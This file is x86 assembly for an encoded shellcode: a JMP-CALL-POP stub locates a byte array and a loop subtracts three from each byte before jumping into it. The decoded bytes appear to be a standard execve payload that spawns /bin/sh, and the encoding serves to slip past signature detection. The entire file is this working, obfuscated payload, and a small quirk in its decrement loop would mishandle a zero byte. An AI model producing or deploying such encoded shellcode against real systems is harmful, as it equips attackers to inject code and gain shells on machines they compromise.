global _start
section .text

_start:

jmp short call_shellcode

decoder:
	pop esi
	xor ebx,ebx
	xor ecx,ecx
	mov cl , length

decode:
	mov bl , byte[esi]

decrease:
	dec bl
	dec bl
decrement:
	dec bl
	jz short decrement
	mov byte [esi] , bl
	inc esi
	loop decode
	jmp short Shellcode

call_shellcode:
	call decoder
	Shellcode: db 0x34,0xcc,0xfa,0xe4,0x54,0x6b,0x32,0x32,0x76,0x6b,0x6b,0x32,0x65,0x6c,0x71,0x8c,0xe6,0xb3,0x0e,0xd0,0x83
	length equ $-Shellcode
